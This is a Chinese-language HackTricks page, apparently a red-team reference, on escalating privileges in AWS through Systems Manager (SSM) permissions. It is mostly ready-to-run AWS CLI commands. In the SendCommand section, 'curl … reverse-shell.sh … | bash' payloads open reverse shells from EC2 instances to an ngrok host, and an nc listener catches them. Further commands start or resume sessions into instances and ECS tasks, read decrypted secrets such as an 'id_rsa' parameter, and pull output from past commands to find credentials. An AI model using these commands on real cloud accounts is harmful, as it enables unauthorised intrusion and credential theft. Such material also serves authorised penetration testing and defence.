# AWS - SSM权限提升

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## SSM

有关SSM的更多信息，请查看：

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

拥有**`ssm:SendCommand`**权限的攻击者可以在运行Amazon SSM代理的实例中**执行命令**，并**威胁到其中运行的IAM角色**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
如果您正在使用此技术来提升已经受损 EC2 实例内的权限，您可以通过以下方式在本地捕获反向 shell：
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在影响:** 直接提升权限至运行具有运行SSM代理的EC2 IAM角色。

### `ssm:StartSession`

拥有**`ssm:StartSession`**权限的攻击者可以在运行Amazon SSM代理的实例中**启动类似SSH的会话**，并**危害其中运行的IAM角色**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
要启动会话，您需要安装**SessionManagerPlugin**：[https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**潜在影响：** 直接提升权限以访问运行中带有运行SSM代理的EC2 IAM角色。

#### 提升权限至ECS

当**ECS任务**以**启用`ExecuteCommand`**的方式运行时，具有足够权限的用户可以使用`ecs execute-command`在容器内部**执行命令**。\
根据[**文档**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)，这是通过在启动“_exec_”命令的设备和带有SSM会话管理器的目标容器之间创建安全通道来完成的。\
因此，具有`ssm:StartSession`权限的用户将能够通过以下方式在启用该选项的ECS任务中获取shell：
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (185).png>)

**潜在影响:** 直接提升至运行具有`ExecuteCommand`启用的`ECS`IAM角色的任务。

### `ssm:ResumeSession`

拥有权限**`ssm:ResumeSession`**的攻击者可以在运行Amazon SSM Agent的实例中重新**启动类似SSH的会话**，当SSM会话状态**断开**时，并**危及其中运行的IAM角色**。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在影响:** 直接提升至运行实例附加的 EC2 IAM 角色，前提是运行 SSM 代理并且会话处于断开状态。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

具有上述权限的攻击者将能够列出 **SSM 参数** 并以明文形式**读取**它们。在这些参数中，您经常可以找到诸如 SSH 密钥或 API 密钥等**敏感信息**。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**潜在影响:** 查找参数中的敏感信息。

### `ssm:ListCommands`

拥有此权限的攻击者可以列出所有发送的**命令**，并希望在其中找到**敏感信息**。
```
aws ssm list-commands
```
**潜在影响:** 在命令行中查找敏感信息。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

拥有这些权限的攻击者可以列出所有发送的**命令**并**读取生成的输出**，希望在其中找到**敏感信息**。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在影响:** 在命令行输出中查找敏感信息。

### Codebuild

您还可以使用SSM进入正在构建的codebuild项目：

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
